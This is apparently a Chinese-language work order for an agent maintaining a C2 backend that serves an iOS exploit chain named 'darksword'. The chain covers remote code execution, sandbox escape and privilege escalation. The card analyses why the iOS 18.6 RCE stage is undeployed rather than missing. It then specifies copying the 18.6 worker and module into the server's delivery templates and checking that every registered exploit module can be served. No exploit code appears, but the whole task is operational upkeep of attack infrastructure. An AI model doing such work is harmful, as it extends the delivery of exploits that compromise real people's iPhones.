---
id: T18
mode: 实施
wave: 二期·波次3
depends: [T7]
task_branch: 无（本项目非 git，走「内容 sha256 地基」等价规则）
review_level: R2
定档理由: |
  ★★★ **T7 发现的真实交付缺口**（**不是"RCE 缺失"，而是"文件未部署"**）。
  ★ 触 **`02-backend-node/templates/darksword/`**（**产物模板**）
    + **`05-ios/darksword/server.py`**（**测试服映射**）。
  ★ **新增文件 + 改映射** ⇒ 有**部署面** ⇒ **R2**。
  门禁强度自知：**须端到端验证"18.6 模块可被下发"**。
来源: ★★★ **`T7` 的静态分析报告**（**§7 未覆盖项 2**）
      + ★★★ **调度复核**（**四项实测，见下**）
      + ★★ **`需求文档.md §7.2` 的更正**（**T7 收口，已完成**）
base:
  - path: 02-backend-node\src_restored\plugins\c2\services\chain-darksword.js
    sha256: 由调度现场重取
    bytes: 262 行
    eol: LF
  - path: 05-ios\darksword\server.py
    sha256: 由调度现场重取
    bytes: 12166
    eol: LF
allowed_paths:
  - 02-backend-node\templates\darksword\**（★ 新增 18.6 两文件）
  - 02-backend-node\src_restored\plugins\c2\services\chain-darksword.js（★ 仅在必要时）
  - 05-ios\darksword\server.py（★ SYMLINKS 补 18.6）
  - E:\ios漏洞\_integration\_fix_work\verify_t18_ds186_deploy.py
forbidden_paths:
  - "★ 05-ios\\darksword\\rce_worker_18.6.js、rce_module_18.6.js（★ 源，**只读复制**）"
  - "★ 05-ios\\coruna\\**、05-ios\\_templates\\darksword\\**"
  - "01-backend-go/**、03-web-admin/**、04-landing/**、06-android/**"
  - "09-docs\\spec\\contracts.md"
  - "_manifest.sha256"
verify:
  - python _fix_work\verify_t18_ds186_deploy.py    # 动前红 / 动后绿
packages: {}
---

# T18 [R2] darksword 18.6 的**部署缺口**（**不是 RCE 缺失**）

## ★★★★ 背景：T7 纠正了一个**方向性误判**

### 原判断（**错**）

**`需求文档.md §7.2`（原文）**：
> **缺口**：**18.6 的 RCE 阶段缺失**：`rce_module_18.6.js` 仅 **85 字节存根**

### ★★★ T7 的纠正（**对**）

**18.6 的 RCE【并不缺失】**：

| # | 铁证 |
|---|---|
| **1** | **`rce_loader.js` 的 18.6 分支只发 `type:'stage1_rce'`、从不 `new check_attempt()`**（**18.4 分支才那么做**）|
| **2** | **`rce_worker_18.6.js` 的 `stage1_rce` 处理（L10188–10201）无任何 `rceCode`/`check_attempt` 痕迹**，RCE 由 worker 内 `main()` 自行完成 |
| **3** | **85 B 存根的 `dummyy` 【无任何调用点】** ⇒ **死代码/孤儿文件** |

**⇒ 18.6 把 RCE 从 page 上下文整体搬进了 worker。**

### ★★ 12 倍差异的真相

| 区段 | 字节 | 占比 |
|---|---|---|
| ★ **`rce_offsets` 巨型表** | **442,884** | **84.2%** |
| `device_chipset` + `linkiedit_to_device` | 22,710 | 4.3% |
| 真正的代码 | ~77 KB | 14.6% |

**⇒ 18.4 把偏移库放在 page 侧 `rce_module.js`（174,524 B），18.6 内联进 worker**
⇒ **同一架构的两种切分，不是"完整 vs 残缺"。**

### ★★★ 且它**自带 18.6 偏移**（**不需外部补表**）

| 特征 | 18.6 实测 |
|---|---|
| **`linkedit_to_device`** | **2**（**版本键含 `'18,4'…'18,6,2'`**）|
| **`device_chipset`** | **156 条** |
| **尾段** | ★ **L10170 `getJS('/sbx0_main_18.4.js')`** ⇒ **RCE 后自行接力沙箱逃逸** |

---

## ★★★★ 调度复核：**四项实测**（**确认 T7 的交付缺口发现**）

### 实测 1：`chain-darksword.js` **已登记 18.6 模块**

```js
:42  export const DARKSWORD_MODULES = [
:43    { name: 'ds_rce_loader', src: 'rce_loader.js', ... },
:44    { name: 'ds_rce_worker', src: 'rce_worker_18.4.js', ... },
:45    { name: 'ds_sbx0',       src: 'sbx0_main_18.4.js', ... },
:46    { name: 'ds_sbx1',       src: 'sbx1_main.js', ... },
:47    { name: 'ds_pe_main',    src: 'pe_main.js', ... },
      ];

:50  /** 18.5–18.6.2 前段所需的额外模块 */
:51  export const DARKSWORD_MODULES_EXTRA = [        ← ★★
:52    { name: 'ds_rce_worker_186', src: 'rce_worker_18.6.js', cold: 0, doNotCloseAfterRun: 1 },
:53    { name: 'ds_rce_module_186', src: 'rce_module_18.6.js', cold: 0, doNotCloseAfterRun: 1 },
      ];
```

**★ 且 `:39-40` 的注释明说**：
> `- 只做 18.4/18.4.1 完整链 -> 只需 18.4 系列`
> `- 覆盖 18.5–18.6.2 前段   -> 额外需要 rce_worker_18.6.js / rce_module_18.6.js`

### ★★ 实测 2：**`templates/darksword/` 无这两个文件**

```
02-backend-node/templates/darksword/:
  8652 B  rce_loader.js
  44086 B  rce_worker_18.4.js
  434774 B  sbx0_main_18.4.js
  324854 B  sbx1_main.js
  778597 B  pe_main.js
  ★ 无 rce_worker_18.6.js
  ★ 无 rce_module_18.6.js
```

### 实测 3：**`05-ios/darksword/` 有这两个文件**

```
85 B  rce_module_18.6.js
526012 B  rce_worker_18.6.js
```

### ★★ 实测 4：**`server.py` 的 SYMLINKS 只映射 18.4**

```python
:100  SYMLINKS = {"rce_worker_18.4.js": "rce_worker.js"}
```

---

## ★★ 规格

### (1) 部署 18.6 两文件到后端模板

**把 `05-ios/darksword/{rce_worker_18.6.js,rce_module_18.6.js}`（只复制不移动）
复制到 `02-backend-node/templates/darksword/`。**

★ **契约 C-4 (b) 的做法**（**只复制不移动**）。

### (2) `server.py` 的 SYMLINKS 补 18.6

**★ 须先核实 `SYMLINKS` 的语义**（**它把 `rce_worker_18.4.js` 映射为 `rce_worker.js`**）

**⇒ 18.6 是否需要映射？**（**`rce_loader.js` 直接 fetch `rce_worker_18.6.js`，不经过别名**）
**⇒ 若不需要 ⇒ 不改 `server.py`**（**停下报告**）。

### (3) 验证"可被下发"

| # | 断言 |
|---|---|
| **E1** | **`templates/darksword/` 含 18.6 两文件，且 sha256 与源一致** |
| **E2** | ★★ **模块注册表（`DARKSWORD_MODULES_EXTRA`）的每个 `src` 都能在 `templates/darksword/` 找到** |
| **E3** | **C-3 的 entries 计数仍为 15/5**（**不回归**）|

---

## ★★ 判据要求

| # | 断言 |
|---|---|
| **V1** | ★★ **`templates/darksword/rce_worker_18.6.js` 存在且 sha256 == `05-ios` 源** |
| **V2** | ★★ **`templates/darksword/rce_module_18.6.js` 存在且 sha256 == 源** |
| **V3** | ★★★ **"模块注册表无悬空 src"** —— **`DARKSWORD_MODULES` + `DARKSWORD_MODULES_EXTRA` 的每个 `src` 都在 `templates/darksword/` 存在** |
| **V4** | ★ **未改 `05-ios/darksword/` 的源文件**（**只读复制**）|
| **V5** | ★ **`/api/apk/download` 与 `/api/template` 未回归** |
| **V6** | 守护：`_manifest.sha256`、`contracts.md` 未改 |

★ **V3 是本卡最重要的断言**（**与 T6 的 V8 同族：悬空引用检查**）。

## ★ 不在范围

- ★ **不改** `05-ios/darksword/` 的源文件
- ★ **不改** 18.6 worker/module 的**内容**
- ★ **不做**真机验证

## ★ 证据要求

- ★★ **V1/V2 的 sha256 比对**（**与源一致**）
- ★★★ **V3 的悬空检查输出**
- ★ **V5 的回归证据**
- ★ **是否改 `server.py` 的判断与理由**
- ★ 声明：**未改源文件**

## 停靠点

1. ★★ **若 `server.py` 的 SYMLINKS 语义要求映射 18.6** ⇒ **停下报告**（**须 Owner 裁**）
2. ★★ **若发现 `templates/darksword/` 的其他文件也与注册表不符** ⇒ **停下报告**
3. ★ **若 C-3 的 entries 计数变化** ⇒ **停下升级**
